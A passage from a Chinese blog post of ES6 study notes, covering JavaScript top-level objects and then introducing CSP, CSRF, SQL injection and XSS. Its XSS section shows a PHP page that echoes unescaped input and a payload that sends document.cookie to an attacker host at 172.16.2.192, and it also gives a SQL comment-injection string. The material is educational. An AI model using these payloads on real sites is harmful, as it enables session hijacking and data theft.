或者采用通用方法，写成this.a</div><div class="line">window.a // 1</div><div class="line"></div><div class="line">let b = 1;</div><div class="line">window.b // undefined，最新版本的谷歌浏览器的确输出undefined</div></pre></td></tr></table></figure>
<h5 id="global-对象"><a href="#global-对象" class="headerlink" title="global 对象"></a>global 对象</h5><ul>
<li>浏览器里面，顶层对象是window，但 Node 和 Web Worker 没有window。</li>
<li>浏览器和 Web Worker 里面，self也指向顶层对象，但是Node没有self。</li>
<li>Node 里面，顶层对象是global，但其他环境都不支持。</li>
</ul>
<p>==那么问题来了，Web Worker又是什么东西，<del>我特地百度了一下</del> 谷歌了一下==</p>
<h5 id="Web-Worker"><a href="#Web-Worker" class="headerlink" title="Web Worker"></a>Web Worker</h5><h6 id="当在-HTML-页面中执行脚本时，页面的状态是不可响应的，直到脚本已完成。"><a href="#当在-HTML-页面中执行脚本时，页面的状态是不可响应的，直到脚本已完成。" class="headerlink" title="当在 HTML 页面中执行脚本时，页面的状态是不可响应的，直到脚本已完成。"></a>当在 HTML 页面中执行脚本时，页面的状态是不可响应的，直到脚本已完成。</h6><h6 id="web-worker-是运行在后台的-JavaScript，独立于其他脚本，不会影响页面的性能。您可以继续做任何愿意做的事情：点击、选取内容等等，而此时-web-worker-在后台运行。"><a href="#web-worker-是运行在后台的-JavaScript，独立于其他脚本，不会影响页面的性能。您可以继续做任何愿意做的事情：点击、选取内容等等，而此时-web-worker-在后台运行。" class="headerlink" title="web worker 是运行在后台的 JavaScript，独立于其他脚本，不会影响页面的性能。您可以继续做任何愿意做的事情：点击、选取内容等等，而此时 web worker 在后台运行。"></a>web worker 是运行在后台的 JavaScript，独立于其他脚本，不会影响页面的性能。您可以继续做任何愿意做的事情：点击、选取内容等等，而此时 web worker 在后台运行。</h6><p>==注释：web worker 通常不用于如此简单的脚本，而是用于更耗费 CPU 资源的任务。==</p>
<h5 id="既然是这样的话，那我感觉短时间内应该是用不到它了。"><a href="#既然是这样的话，那我感觉短时间内应该是用不到它了。" class="headerlink" title="既然是这样的话，那我感觉短时间内应该是用不到它了。"></a>既然是这样的话，那我感觉短时间内应该是用不到它了。</h5><h6 id="同一段代码为了能够在各种环境，都能取到顶层对象，现在一般是使用this变量，但是有局限性。"><a href="#同一段代码为了能够在各种环境，都能取到顶层对象，现在一般是使用this变量，但是有局限性。" class="headerlink" title="同一段代码为了能够在各种环境，都能取到顶层对象，现在一般是使用this变量，但是有局限性。"></a>同一段代码为了能够在各种环境，都能取到顶层对象，现在一般是使用this变量，但是有局限性。</h6><ul>
<li>全局环境中，this会返回顶层对象。但是，Node模块和ES6模块中，this返回的是当前模块。</li>
<li>函数里面的this，如果函数不是作为对象的方法运行，而是单纯作为函数运行，this会指向顶层对象。但是，严格模式下，这时this会返回undefined 。++这个我真不知道++</li>
<li>不管是严格模式，还是普通模式，new Function(‘return this’)()，总是会返回全局对象。但是，如果浏览器用了CSP（Content Security Policy，内容安全政策）==又来一个没听过的，结尾我再着重讲着个==，那么eval、new Function这些方法都可能无法使用。</li>
</ul>
<h6 id="综上所述，很难找到一种方法，可以在所有情况下，都取到顶层对象。下面是两种勉强可以使用的方法。"><a href="#综上所述，很难找到一种方法，可以在所有情况下，都取到顶层对象。下面是两种勉强可以使用的方法。" class="headerlink" title="综上所述，很难找到一种方法，可以在所有情况下，都取到顶层对象。下面是两种勉强可以使用的方法。"></a>综上所述，很难找到一种方法，可以在所有情况下，都取到顶层对象。下面是两种勉强可以使用的方法。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">// 方法一，window不为空的情况下返回windows，否则判断是否是nodejs环境，如果是，返回global对象，否则直接返回this对象（应该是指webworker环境）</div><div class="line">(typeof window !== &apos;undefined&apos;</div><div class="line">   ? window</div><div class="line">   : (typeof process === &apos;object&apos; &amp;&amp;</div><div class="line">      typeof require === &apos;function&apos; &amp;&amp;</div><div class="line">      typeof global === &apos;object&apos;)</div><div class="line">     ? global</div><div class="line">     : this);</div><div class="line"></div><div class="line">// 方法二，这个很容易看懂</div><div class="line">var getGlobal = function () &#123;</div><div class="line">  if (typeof self !== &apos;undefined&apos;) &#123; return self; &#125;</div><div class="line">  if (typeof window !== &apos;undefined&apos;) &#123; return window; &#125;</div><div class="line">  if (typeof global !== &apos;undefined&apos;) &#123; return global; &#125;</div><div class="line">  throw new Error(&apos;unable to locate global object&apos;);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h6 id="现在有一个提案，在语言标准的层面，引入global作为顶层对象。也就是说，在所有环境下，global都是存在的，都可以从它拿到顶层对象。垫片库system-global模拟了这个提案，可以在所有环境拿到global。"><a href="#现在有一个提案，在语言标准的层面，引入global作为顶层对象。也就是说，在所有环境下，global都是存在的，都可以从它拿到顶层对象。垫片库system-global模拟了这个提案，可以在所有环境拿到global。" class="headerlink" title="现在有一个提案，在语言标准的层面，引入global作为顶层对象。也就是说，在所有环境下，global都是存在的，都可以从它拿到顶层对象。垫片库system.global模拟了这个提案，可以在所有环境拿到global。"></a>现在有一个提案，在语言标准的层面，引入global作为顶层对象。也就是说，在所有环境下，global都是存在的，都可以从它拿到顶层对象。垫片库system.global模拟了这个提案，可以在所有环境拿到global。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">// CommonJS的写法</div><div class="line">require(&apos;system.global/shim&apos;)();</div><div class="line"></div><div class="line">// ES6模块的写法</div><div class="line">import shim from &apos;system.global/shim&apos;; shim();</div></pre></td></tr></table></figure>
<h6 id="上面代码可以保证各种环境里面，global对象都是存在的。"><a href="#上面代码可以保证各种环境里面，global对象都是存在的。" class="headerlink" title="上面代码可以保证各种环境里面，global对象都是存在的。"></a>上面代码可以保证各种环境里面，global对象都是存在的。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">// CommonJS的写法</div><div class="line">var global = require(&apos;system.global&apos;)();</div><div class="line"></div><div class="line">// ES6模块的写法</div><div class="line">import getGlobal from &apos;system.global&apos;;</div><div class="line">const global = getGlobal();</div></pre></td></tr></table></figure>
<h6 id="上面代码将顶层对象放入变量global。"><a href="#上面代码将顶层对象放入变量global。" class="headerlink" title="上面代码将顶层对象放入变量global。"></a>上面代码将顶层对象放入变量global。</h6><h2 id="CSP和XXS-CSRF"><a href="#CSP和XXS-CSRF" class="headerlink" title="CSP和XXS,CSRF"></a>CSP和XXS,CSRF</h2><h5 id="CSP（内容安全策略）"><a href="#CSP（内容安全策略）" class="headerlink" title="CSP（内容安全策略）"></a>CSP（内容安全策略）</h5><h6 id="为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。"><a href="#为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。" class="headerlink" title="为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。"></a>为了缓解很大一部分潜在的跨站脚本问题，浏览器的扩展程序系统引入了内容安全策略（CSP）的一般概念。这将引入一些相当严格的策略，会使扩展程序在默认情况下更加安全，开发者可以创建并强制应用一些规则，管理网站允许加载的内容。</h6><p><em>涉及web安全方面，我一直以来只了解过CSRF，CSP是专门用来阻止部分XXS攻击</em></p>
<h5 id="首先列举常见的web攻击方式"><a href="#首先列举常见的web攻击方式" class="headerlink" title="首先列举常见的web攻击方式"></a>首先列举常见的web攻击方式</h5><ul>
<li>Dos攻击（Denial of Service attack）</li>
</ul>
<h6 id="是一种针对服务器的能够让服务器呈现静止状态的攻击方式。有时候也加服务停止攻击或拒绝服务攻击。其原理就是发送大量的合法请求到服务器，服务器无法分辨这些请求是正常请求还是攻击请求，所以都会照单全收。海量的请求会造成服务器停止工作或拒绝服务的状态。这就是Dos攻击。"><a href="#是一种针对服务器的能够让服务器呈现静止状态的攻击方式。有时候也加服务停止攻击或拒绝服务攻击。其原理就是发送大量的合法请求到服务器，服务器无法分辨这些请求是正常请求还是攻击请求，所以都会照单全收。海量的请求会造成服务器停止工作或拒绝服务的状态。这就是Dos攻击。" class="headerlink" title="是一种针对服务器的能够让服务器呈现静止状态的攻击方式。有时候也加服务停止攻击或拒绝服务攻击。其原理就是发送大量的合法请求到服务器，服务器无法分辨这些请求是正常请求还是攻击请求，所以都会照单全收。海量的请求会造成服务器停止工作或拒绝服务的状态。这就是Dos攻击。"></a>是一种针对服务器的能够让服务器呈现静止状态的攻击方式。有时候也加服务停止攻击或拒绝服务攻击。其原理就是发送大量的合法请求到服务器，服务器无法分辨这些请求是正常请求还是攻击请求，所以都会照单全收。海量的请求会造成服务器停止工作或拒绝服务的状态。这就是Dos攻击。</h6><ul>
<li>跨站点请求伪造（CSRF，Cross-Site Request Forgeries）</li>
</ul>
<h6 id="是指攻击者通过已经设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态的更新。属于被动攻击。更简单的理解就是攻击者盗用了你的名义，以你的名义发送了请求。"><a href="#是指攻击者通过已经设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态的更新。属于被动攻击。更简单的理解就是攻击者盗用了你的名义，以你的名义发送了请求。" class="headerlink" title="是指攻击者通过已经设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态的更新。属于被动攻击。更简单的理解就是攻击者盗用了你的名义，以你的名义发送了请求。"></a>是指攻击者通过已经设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态的更新。属于被动攻击。更简单的理解就是攻击者盗用了你的名义，以你的名义发送了请求。</h6><h6 id="一个CSRF最简单的例子就是用户A登录了网站A在虚拟账户里转账了1000块钱，用户A在本地生成了网站A的cookie，用户A在没有关闭网站A的情况下有访问了恶意网站B，恶意网站B包含请求A网站的代码，利用了本地的cookie经过身份验证的身份又向网站A发送了一次请求，这时你就会发现你在网站A的账户又少了1000块。这就是基本的CSRF攻击方式。"><a href="#一个CSRF最简单的例子就是用户A登录了网站A在虚拟账户里转账了1000块钱，用户A在本地生成了网站A的cookie，用户A在没有关闭网站A的情况下有访问了恶意网站B，恶意网站B包含请求A网站的代码，利用了本地的cookie经过身份验证的身份又向网站A发送了一次请求，这时你就会发现你在网站A的账户又少了1000块。这就是基本的CSRF攻击方式。" class="headerlink" title="一个CSRF最简单的例子就是用户A登录了网站A在虚拟账户里转账了1000块钱，用户A在本地生成了网站A的cookie，用户A在没有关闭网站A的情况下有访问了恶意网站B，恶意网站B包含请求A网站的代码，利用了本地的cookie经过身份验证的身份又向网站A发送了一次请求，这时你就会发现你在网站A的账户又少了1000块。这就是基本的CSRF攻击方式。"></a>一个CSRF最简单的例子就是用户A登录了网站A在虚拟账户里转账了1000块钱，用户A在本地生成了网站A的cookie，用户A在没有关闭网站A的情况下有访问了恶意网站B，恶意网站B包含请求A网站的代码，利用了本地的cookie经过身份验证的身份又向网站A发送了一次请求，这时你就会发现你在网站A的账户又少了1000块。这就是基本的CSRF攻击方式。</h6><ul>
<li>SOL注入攻击</li>
</ul>
<h6 id="是指通过对web连接的数据库发送恶意的SQL语句而产生的攻击，从而产生安全隐患和对网站的威胁，可以造成逃过验证或者私密信息泄露等危害。"><a href="#是指通过对web连接的数据库发送恶意的SQL语句而产生的攻击，从而产生安全隐患和对网站的威胁，可以造成逃过验证或者私密信息泄露等危害。" class="headerlink" title="是指通过对web连接的数据库发送恶意的SQL语句而产生的攻击，从而产生安全隐患和对网站的威胁，可以造成逃过验证或者私密信息泄露等危害。"></a>是指通过对web连接的数据库发送恶意的SQL语句而产生的攻击，从而产生安全隐患和对网站的威胁，可以造成逃过验证或者私密信息泄露等危害。</h6><h6 id="SQL注入的原理是通过在对SQL语句调用方式上的疏漏，恶意注入SQL语句。"><a href="#SQL注入的原理是通过在对SQL语句调用方式上的疏漏，恶意注入SQL语句。" class="headerlink" title="　　SQL注入的原理是通过在对SQL语句调用方式上的疏漏，恶意注入SQL语句。"></a>　　SQL注入的原理是通过在对SQL语句调用方式上的疏漏，恶意注入SQL语句。</h6><h6 id="SQL注入常见个例子："><a href="#SQL注入常见个例子：" class="headerlink" title="　　SQL注入常见个例子："></a>　　SQL注入常见个例子：</h6><h5 id="私密信息泄露"><a href="#私密信息泄露" class="headerlink" title="　　私密信息泄露"></a>　　私密信息泄露</h5><h6 id="假如一个出版书籍的网站，具有根据作者姓名查询已出版书籍的功能，作者未出版的书籍不能被普通用户看到，因为版权属于隐私的问题。那么假设请求是用HTTP的GET请求来完成的，其地址栏请求内容为：www-book-com-serach-echo"><a href="#假如一个出版书籍的网站，具有根据作者姓名查询已出版书籍的功能，作者未出版的书籍不能被普通用户看到，因为版权属于隐私的问题。那么假设请求是用HTTP的GET请求来完成的，其地址栏请求内容为：www-book-com-serach-echo" class="headerlink" title="　　　　　　　假如一个出版书籍的网站，具有根据作者姓名查询已出版书籍的功能，作者未出版的书籍不能被普通用户看到，因为版权属于隐私的问题。那么假设请求是用HTTP的GET请求来完成的，其地址栏请求内容为：www.book.com?serach=echo"></a>　　　　　　　假如一个出版书籍的网站，具有根据作者姓名查询已出版书籍的功能，作者未出版的书籍不能被普通用户看到，因为版权属于隐私的问题。那么假设请求是用HTTP的GET请求来完成的，其地址栏请求内容为：www.book.com?serach=echo</h6><h6 id="完成此功能的SQL语句为简单的根据条件查找：select-from-book-where-author-‘echo’-and-flag-1-flag等于1代表书籍已出版。"><a href="#完成此功能的SQL语句为简单的根据条件查找：select-from-book-where-author-‘echo’-and-flag-1-flag等于1代表书籍已出版。" class="headerlink" title="　　　　　　　完成此功能的SQL语句为简单的根据条件查找：select * from book where author = ‘echo’ and flag = 1; flag等于1代表书籍已出版。"></a>　　　　　　　完成此功能的SQL语句为简单的根据条件查找：select * from book where author = ‘echo’ and flag = 1; flag等于1代表书籍已出版。</h6><h6 id="这时如果有的用户直接地址栏里输入www-book-com-serach-echo’–-这样请求会发生什么？？"><a href="#这时如果有的用户直接地址栏里输入www-book-com-serach-echo’–-这样请求会发生什么？？" class="headerlink" title="　　　　　　　这时如果有的用户直接地址栏里输入www.book.com?serach=echo’–   这样请求会发生什么？？"></a>　　　　　　　这时如果有的用户直接地址栏里输入www.book.com?serach=echo’–   这样请求会发生什么？？</h6><h6 id="这样的请求传到服务器里的状态会是这样子的-select-from-book-where-author-‘echo’-–-and-flag-1-在SQL语句中–代表注释，会自动忽略掉后面的内容，所以这个请求是骗过服务器把作者为echo的已出版和未出版的书籍全部显示在网页上。造成网站违背开发者的意图，造成信息泄露。"><a href="#这样的请求传到服务器里的状态会是这样子的-select-from-book-where-author-‘echo’-–-and-flag-1-在SQL语句中–代表注释，会自动忽略掉后面的内容，所以这个请求是骗过服务器把作者为echo的已出版和未出版的书籍全部显示在网页上。造成网站违背开发者的意图，造成信息泄露。" class="headerlink" title="　　　　　　　这样的请求传到服务器里的状态会是这样子的 select * from book where author = ‘echo’ – and flag = 1;在SQL语句中–代表注释，会自动忽略掉后面的内容，所以这个请求是骗过服务器把作者为echo的已出版和未出版的书籍全部显示在网页上。造成网站违背开发者的意图，造成信息泄露。"></a>　　　　　　　这样的请求传到服务器里的状态会是这样子的 select * from book where author = ‘echo’ – and flag = 1;在SQL语句中–代表注释，会自动忽略掉后面的内容，所以这个请求是骗过服务器把作者为echo的已出版和未出版的书籍全部显示在网页上。造成网站违背开发者的意图，造成信息泄露。</h6><ul>
<li>XSS攻击（Cross-Site scripting）</li>
</ul>
<h6 id="跨站脚本攻击，是指在通过注册的网站用户的浏览器内运行非法的HTML标签或javascript，从而达到攻击的目的，如盗取用户的cookie，改变网页的DOM结构，重定向到其他网页等。"><a href="#跨站脚本攻击，是指在通过注册的网站用户的浏览器内运行非法的HTML标签或javascript，从而达到攻击的目的，如盗取用户的cookie，改变网页的DOM结构，重定向到其他网页等。" class="headerlink" title="　跨站脚本攻击，是指在通过注册的网站用户的浏览器内运行非法的HTML标签或javascript，从而达到攻击的目的，如盗取用户的cookie，改变网页的DOM结构，重定向到其他网页等。"></a>　跨站脚本攻击，是指在通过注册的网站用户的浏览器内运行非法的HTML标签或javascript，从而达到攻击的目的，如盗取用户的cookie，改变网页的DOM结构，重定向到其他网页等。</h6><h5 id="所有攻击方式里面我最难理解的是xss攻击，为此特地找了一个示例来理解"><a href="#所有攻击方式里面我最难理解的是xss攻击，为此特地找了一个示例来理解" class="headerlink" title="所有攻击方式里面我最难理解的是xss攻击，为此特地找了一个示例来理解"></a>所有攻击方式里面我最难理解的是xss攻击，为此特地找了一个示例来理解</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</div><div class="line">&lt;title&gt;XSS原理重现&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</div><div class="line">  &lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt;</div><div class="line">  &lt;input type=&quot;submit&quot;&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">  &lt;?php</div><div class="line">    $xss = $_GET[&apos;xss_input&apos;];</div><div class="line">    echo &apos;你输入的字符为&lt;br&gt;&apos;.$xss;</div><div class="line">  ?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h6 id="这段代码将input的输入值毫无处理的重新返回给html，那么如果在其中输入alert-‘xss’-会发生什么情况，我经过测试，发现在360和谷歌浏览器中并不会弹出xss，换成低版本ie后会弹出xss，说明现代浏览器针对xss的一些常规攻击手法已经做了一定的限制。但这里只是对xss基础攻击模式做一个演示，以下演示都基于浏览器不做阻止的假设。"><a href="#这段代码将input的输入值毫无处理的重新返回给html，那么如果在其中输入alert-‘xss’-会发生什么情况，我经过测试，发现在360和谷歌浏览器中并不会弹出xss，换成低版本ie后会弹出xss，说明现代浏览器针对xss的一些常规攻击手法已经做了一定的限制。但这里只是对xss基础攻击模式做一个演示，以下演示都基于浏览器不做阻止的假设。" class="headerlink" title="这段代码将input的输入值毫无处理的重新返回给html，那么如果在其中输入alert(‘xss’)会发生什么情况，我经过测试，发现在360和谷歌浏览器中并不会弹出xss，换成低版本ie后会弹出xss，说明现代浏览器针对xss的一些常规攻击手法已经做了一定的限制。但这里只是对xss基础攻击模式做一个演示，以下演示都基于浏览器不做阻止的假设。"></a>这段代码将input的输入值毫无处理的重新返回给html，那么如果在其中输入<script>alert(‘xss’)</script>会发生什么情况，我经过测试，发现在360和谷歌浏览器中并不会弹出xss，换成低版本ie后会弹出xss，说明现代浏览器针对xss的一些常规攻击手法已经做了一定的限制。但这里只是对xss基础攻击模式做一个演示，以下演示都基于浏览器不做阻止的假设。</h6><p>==关键的一步来了==</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt; </div><div class="line">&lt;head&gt; </div><div class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </div><div class="line">&lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt; </div><div class="line">&lt;/head&gt; </div><div class="line">&lt;body&gt; </div><div class="line">&lt;center&gt; </div><div class="line">&lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt; </div><div class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; </div><div class="line">&lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt; </div><div class="line">&lt;input type=&quot;text&quot; name=&quot;xss_input_value&quot; value=&quot;输入&quot;&gt;&lt;br&gt; </div><div class="line">&lt;input type=&quot;submit&quot;&gt; </div><div class="line">&lt;/form&gt; </div><div class="line">&lt;hr&gt; </div><div class="line">&lt;?php </div><div class="line">$xss = $_GET[&apos;xss_input_value&apos;];  </div><div class="line">if(isset($xss))&#123;  </div><div class="line">echo &apos;&lt;input type=&quot;text&quot; value=&quot;&apos;.$xss.&apos;&quot;&gt;&apos;;  </div><div class="line">&#125;else&#123;  </div><div class="line">echo &apos;&lt;input type=&quot;type&quot; value=&quot;输出&quot;&gt;&apos;;  </div><div class="line">&#125;  </div><div class="line">?&gt; </div><div class="line">&lt;/center&gt; </div><div class="line">&lt;/body&gt; </div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p><img src="http://s6.51cto.com/wyfs02/M02/45/CA/wKioL1PrNzric2sCAAAIbSjfxMk032.png" alt="image"></p>
<h6 id="这段代码这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，但是假如我们输入alert-‘xss’-，他并不会执行，那有什么方式可以让他去执行呢，于是一些有心人相处了办法，将”-gt-alert-‘xss’-输入进去，这样会造成什么样的结果，我们可以看下代码"><a href="#这段代码这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，但是假如我们输入alert-‘xss’-，他并不会执行，那有什么方式可以让他去执行呢，于是一些有心人相处了办法，将”-gt-alert-‘xss’-输入进去，这样会造成什么样的结果，我们可以看下代码" class="headerlink" title="这段代码这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，但是假如我们输入alert(‘xss’)，他并不会执行，那有什么方式可以让他去执行呢，于是一些有心人相处了办法，将”&gt;alert(‘xss’)输入进去，这样会造成什么样的结果，我们可以看下代码"></a>这段代码这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，但是假如我们输入<script>alert(‘xss’)</script>，他并不会执行，那有什么方式可以让他去执行呢，于是一些有心人相处了办法，将”&gt;<script>alert(‘xss’)</script>输入进去，这样会造成什么样的结果，我们可以看下代码</h6><p><img src="http://s2.51cto.com/wyfs02/M02/45/C9/wKiom1PrNpaxQcj6AADAFq-wGrI971.png" alt="image"></p>
<h6 id="是不是恍然大悟。因此如果我们把”-gt-alert-‘xss’-换成一段用于获取用户cookie的代码，例如”-gt-window-open-“http-172-16-2-192-xss-hacker-php-cookie-quot-document-cookie-lt-–，当用户将这段代码输入input时必定会将cookie发送到黑客接受的网站。"><a href="#是不是恍然大悟。因此如果我们把”-gt-alert-‘xss’-换成一段用于获取用户cookie的代码，例如”-gt-window-open-“http-172-16-2-192-xss-hacker-php-cookie-quot-document-cookie-lt-–，当用户将这段代码输入input时必定会将cookie发送到黑客接受的网站。" class="headerlink" title="是不是恍然大悟。因此如果我们把”&gt;alert(‘xss’)换成一段用于获取用户cookie的代码，例如”/&gt; window.open(“http://172.16.2.192/xss_hacker.php?cookie=&quot;+document.cookie);&lt;!–，当用户将这段代码输入input时必定会将cookie发送到黑客接受的网站。"></a>是不是恍然大悟。因此如果我们把”&gt;<script>alert(‘xss’)</script>换成一段用于获取用户cookie的代码，例如”/&gt; <script>window.open(“<a href="http://172.16.2.192/xss_hacker.php?cookie=&quot;+document.cookie">http://172.16.2.192/xss_hacker.php?cookie=&quot;+document.cookie</a>);</script>&lt;!–，当用户将这段代码输入input时必定会将cookie发送到黑客接受的网站。</h6><h6 id="那接下来要考虑的就是如何让用户去执行这个输入的操作呢，其实很简单，我们手动将这段代码输入后必定在地址栏生成一个攻击url，只要让用户去点击这个url就行了。因此黑客可以采取各种手段，包括发Email，在各种论坛网站发布此攻击URL，如做成如下诱人连接。"><a href="#那接下来要考虑的就是如何让用户去执行这个输入的操作呢，其实很简单，我们手动将这段代码输入后必定在地址栏生成一个攻击url，只要让用户去点击这个url就行了。因此黑客可以采取各种手段，包括发Email，在各种论坛网站发布此攻击URL，如做成如下诱人连接。" class="headerlink" title="那接下来要考虑的就是如何让用户去执行这个输入的操作呢，其实很简单，我们手动将这段代码输入后必定在地址栏生成一个攻击url，只要让用户去点击这个url就行了。因此黑客可以采取各种手段，包括发Email，在各种论坛网站发布此攻击URL，如做成如下诱人连接。"></a>那接下来要考虑的就是如何让用户去执行这个输入的操作呢，其实很简单，我们手动将这段代码输入后必定在地址栏生成一个攻击url，只要让用户去点击这个url就行了。因此黑客可以采取各种手段，包括发Email，在各种论坛网站发布此攻击URL，如做成如下诱人连接。</h6><p>==但是经过测试，目前主流浏览器，包括ie8，在直接点击该攻击url时，都会被浏览器自身阻止xss行为，因此xss攻击必然有更为复杂的模式，有兴趣的兄弟可以自己研究去==</p>
<h5 id="再次回到CSP"><a href="#再次回到CSP" class="headerlink" title="再次回到CSP"></a>再次回到CSP</h5><h6 id="csp可以直接在html的meta中指定，其作用在于使用白名单指定能够运行的脚本，禁止一切认为有害的执行语句运行。具体的可以查看这篇文章"><a href="#csp可以直接在html的meta中指定，其作用在于使用白名单指定能够运行的脚本，禁止一切认为有害的执行语句运行。具体的可以查看这篇文章" class="headerlink" title="csp可以直接在html的meta中指定，其作用在于使用白名单指定能够运行的脚本，禁止一切认为有害的执行语句运行。具体的可以查看这篇文章"></a>csp可以直接在html的meta中指定，其作用在于使用白名单指定能够运行的脚本，禁止一切认为有害的执行语句运行。具体的可以查看这篇文章</h6><p><a href="http://www.jb51.net/html5/57164.html" target="_blank" rel="external">HTML5安全介绍之内容安全策略（CSP）简介</a></p>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/ES6/" rel="tag">#ES6</a>
          
        </div>
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2017/02/14/内网穿透工具tunnel-mobi使用教程/" rel="next" title="内网穿透工具tunnel.mobi使用教程">
                <i class="fa fa-chevron-left"></i> 内网穿透工具tunnel.mobi使用教程
              </a>
            
          </div>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2017/02/21/神奇的JS之null和undefined/" rel="prev" title="神奇的JS之null和undefined">
                神奇的JS之null和undefined <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
        <div class="ds-share flat" data-thread-key="2017/02/17/ES6学习笔记一（let-和-const-命令）/"
     data-title="ES6学习笔记一（let 和 const 命令）"
     data-content=""
     data-url="http://www.wanzhuhao.cn/2017/02/17/ES6学习笔记一（let-和-const-命令）/">
  <div class="ds-share-inline">
    <ul  class="ds-share-icons-16">

      <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
      <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
      <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
      <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
      <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>

    </ul>
    <div class="ds-share-icons-more">
    </div>
  </div>
</div>
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
      <div class="ds-thread" data-thread-key="2017/02/17/ES6学习笔记一（let-和-const-命令）/"
           data-title="ES6学习笔记一（let 和 const 命令）" data-url="http://www.wanzhuhao.cn/2017/02/17/ES6学习笔记一（let-和-const-命令）/">
      </div>
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.gif"
               alt="ShengNan" />
          <p class="site-author-name" itemprop="name">ShengNan</p>
